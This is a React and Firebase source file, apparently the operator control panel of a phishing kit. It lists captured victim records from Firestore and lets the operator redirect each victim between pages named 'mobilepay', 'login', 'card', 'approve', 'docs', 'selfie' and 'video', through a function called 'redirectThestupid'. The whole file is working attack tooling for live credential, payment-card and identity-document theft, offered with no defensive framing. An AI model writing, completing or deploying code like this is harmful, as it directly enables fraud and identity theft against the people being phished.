import {
  collection,
  doc,
  getDocs,
  onSnapshot,
  orderBy,
  query,
  setDoc,
  updateDoc,
  where,
} from "firebase/firestore";
import React, { useEffect, useState } from "react";
import { db } from "../../firebase";
import AdminCard from "../../components/AdminCard";

function God() {
  const [controller, setControllers] = useState();
  const [data, setData] = useState([]);
  const [pages, setPages] = useState([
    "mobilepay",
    "login",
    "card",
    "approve",
    "docs",
    "selfie",
    "video",
  ]);

  const getUsersControllers = async () => {
    const ids = [];
    const unsub = onSnapshot(collection(db, "admin"), (cl) => {
      let usersData = cl.docs.map((doc) => {
        ids.push(doc.id.replace("+", ""));
        return {
          id: doc.id,
          ...doc.data(),
        };
      });
      console.log(usersData);
      usersData = usersData.sort((a, b) => new Date(b.date) - new Date(a.date));
      console.log(usersData);
      setControllers(usersData);
      getContentById(ids);
    });
  };

  // const toggleTab = (isControl, tab) => {
  //   setIsController(isControl);
  //   setSelectedELm(tab);
  // };

  const getPassedUserData = (id) => {
    return data
      ?.filter((elm) => elm[0]?.id == id.replaceAll("+", ""))
      .flat()
      .map((e) => {
        const { id, ...rest } = e;
        return rest;
      });
  };

  const getContentById = async (ids) => {
    // don't run if there aren't any ids or a path for the collection
    if (!ids || !ids.length) return [];

    const batches = [];

    while (ids.length) {
      // firestore limits batches to 10
      const batch = ids.splice(0, 10);

      // add the batch request to to a queue
      batches.push(await getUserData(batch));
    }
    // after all of the data is fetched, return it
    return Promise.all(batches).then((content) => setData(content.flat()));
  };

  const getUserData = async (ids) => {
    const q = query(collection(db, "Users"), where("id", "in", ids));
    const datas = {};
    const querySnapshot = await getDocs(q);
    querySnapshot.forEach((doc) => {
      datas[doc.data().id] = [...(datas[doc.data().id] || []), doc.data()];
    });
    return Object.values(datas);
  };

  const redirectThestupid = async (identifier, params) => {
    console.log(params);
    await updateDoc(doc(db, "admin", identifier), {
      loading: false,
      ...params,
    });
  };

  useEffect(() => {
    getUsersControllers();
  }, []);
  [];

  return (
    <>
      {controller &&
        controller.map((ctr, index) => (
          <AdminCard
            key={index}
            ctr={ctr}
            getPassedUserData={getPassedUserData}
            redirectThestupid={redirectThestupid}
            pages={pages}
          />
        ))}
    </>
  );
}

export default God;
